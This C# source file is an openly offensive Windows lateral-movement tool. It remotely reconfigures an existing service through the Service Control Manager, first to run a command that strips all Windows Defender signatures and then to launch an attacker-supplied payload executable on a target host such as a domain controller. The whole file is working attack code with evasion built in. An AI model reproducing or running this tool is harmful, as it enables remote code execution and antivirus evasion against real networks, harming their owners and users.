using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Lateral
{
    class Program
    {

        [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", ExactSpelling=true, CharSet=CharSet.Unicode, SetLastError=true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathname, string lpLoadOrderGroup,
            string lpdwTagId, string lpDependencies, string lpServiceStartname, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        static void Main(string[] args)
        {

            if (args.Length < 3)
            {
                Console.WriteLine("Usage: Lateral.exe dc01.corp.com SensorService path\\to\\executable");
                return;
            }
            //String target = "cdc07.ops.comply.com";
            String target = args[0];
            string signature = "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All";
            //target host, default database, access right SC_MANAGER_ALL_ACCESS(full access)

            IntPtr SCMHandle = OpenSCManager(target, null, 0xF003F);

            //String ServiceName = "SensorService";
            String ServiceName = args[1];
            IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);

            //string payload = "C:\\inject.exe";
            String payload = args[2];
            
            //Added to remove Windows Defender signatures, then trigger payload
            bool bResult = ChangeServiceConfigA(schService, 0xFFFFFFFF, 3, 0, signature, null, null, null, null, null, null);
            bResult = StartService(schService, 0, null);

            bResult = ChangeServiceConfigA(schService, 0xFFFFFFFF, 3, 0, payload, null, null, null, null, null, null);
            bResult = StartService(schService, 0, null);


            
        }
    }
}
